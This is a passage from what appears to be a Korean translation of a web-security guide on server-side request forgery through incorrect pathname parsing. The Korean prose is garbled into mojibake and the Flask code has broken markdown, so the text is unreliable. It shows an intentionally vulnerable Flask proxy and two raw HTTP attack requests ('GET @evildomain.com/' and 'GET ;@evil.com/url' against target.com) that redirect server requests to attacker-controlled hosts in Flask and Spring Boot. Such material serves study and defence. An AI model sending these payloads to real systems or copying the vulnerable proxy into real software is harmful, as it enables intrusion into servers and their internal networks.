app = Flask('**main**') SITE\_NAME = 'https://google.com'

@app.route('/', defaults={'path': ''}) @app.route('/[path:path](path:path)')

def proxy(path): return get(f'{SITE\_NAME}{path}').content

if **name** == "**main**": app.run(threaded=False)

````
</details>

FlaskëŠ” **`@`**ë¥¼ ì´ˆê¸° ë¬¸ìë¡œ ì‚¬ìš©í•  ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤. ì´ëŠ” **ì´ˆê¸° í˜¸ìŠ¤íŠ¸ ì´ë¦„ì„ ì‚¬ìš©ì ì´ë¦„**ìœ¼ë¡œ ë§Œë“¤ê³  ìƒˆë¡œìš´ ê²ƒì„ ì£¼ì…í•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤. ê³µê²© ìš”ì²­:
```http
GET @evildomain.com/ HTTP/1.1
Host: target.com
Connection: close
````

#### Spring Boot <a href="#heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation" id="heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation"></a>

ì·¨ì•½í•œ ì½”ë“œ:

<img src="../../.gitbook/assets/image (729).png" alt="" data-size="original">

ìš”ì²­ì˜ ê²½ë¡œë¥¼ **`:`** ë¬¸ìë¡œ ì‹œì‘í•  ìˆ˜ ìˆì–´ ìƒˆ í˜¸ìŠ¤íŠ¸ë¥¼ ì£¼ì…í•˜ì—¬ ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆëŠ” **`@`** ë¬¸ìë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆë‹¤ëŠ” ê²ƒì„ ë°œê²¬í–ˆìŠµë‹ˆë‹¤. ê³µê²© ìš”ì²­:

```http
GET ;@evil.com/url HTTP/1.1
Host: target.com
Connection: close
```

#### PHP ë‚´ì¥ ì›¹ ì„œë²„ <a href="#heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation" id="heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation"></a>

</details>
